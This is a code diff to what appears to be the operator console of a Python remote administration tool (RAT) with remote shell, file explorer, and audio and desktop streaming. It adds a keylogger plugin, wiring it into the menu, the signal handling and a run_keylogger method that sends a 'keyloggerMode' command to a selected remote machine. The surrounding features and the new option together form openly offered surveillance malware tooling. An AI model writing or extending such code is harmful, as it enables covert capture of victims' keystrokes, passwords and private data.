@@ -25,6 +25,7 @@ from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
 from plugins.mdesktop import main as mdesktop
+from plugins.mkeylogger import main as mkeylogger
 
 
 # initial geo ip database
@@ -131,6 +132,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
         self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))
+        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
 
     # Start Listen for Servers
     def listen_start(self):
@@ -416,6 +418,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                  self.run_explorer)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming', self.run_audio)
             self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming', self.run_desktop)
+            self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Keylogger', self.run_keylogger)
 
             self.eMenu.addSeparator()
             self.eMenu.addMenu(self.optionsMenu)
@@ -440,6 +443,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
             'desktopMode': 'executeDesktop()',
+            'keyloggerMode': 'executeKeylogger()'
         }
         if signal in signals:
             self.current_sock = sock
@@ -451,6 +455,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorer': mexplorer,
             'audio': maudio,
             'desktop': mdesktop,
+            'keylogger': mkeylogger
         }
 
         server = self.current_server()
@@ -484,6 +489,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         server = self.current_server()
         if server:
             send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'desktopMode')
+
+    def run_keylogger(self):
+        server = self.current_server()
+        if server:
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'keyloggerMode')
 
     def closeEvent(self, event):
         sys.exit(1)
